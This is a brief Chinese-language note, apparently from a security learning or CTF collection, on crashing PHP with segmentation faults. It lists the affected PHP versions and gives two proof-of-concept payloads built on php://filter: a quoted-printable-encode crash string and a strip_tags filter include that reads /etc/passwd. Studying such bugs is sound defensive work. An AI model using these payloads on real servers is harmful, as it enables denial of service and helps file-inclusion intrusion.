## Segmentation fault

**参考文章**

- https://hackmd.io/s/Hk-2nUb3Q
- https://www.jianshu.com/p/dfd049924258

### 超大字符
**参考**：

- https://bugs.php.net/bug.php?id=77359  

- https://www.php.net/ChangeLog-7.php
- https://www.php.net/ChangeLog-5.php

**版本：**

- php5<5.6.39
- php7.0<7.0.33
- php7.1<7.1.25
- php7.2<7.2.13
- php7.3不可利用

**测试代码**

```php
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
```

因为安装编译特定的PHP版本太过麻烦（以后可能会做，再补充相关环境测试的截图），所以就没有截图证明了。可以查看参考文章。

### trip_tags

同上，但是在版本PHP7.0.33成功复现
```php
<?php
include("php://filter/string.strip_tags/resource=/etc/passwd");
?>

```


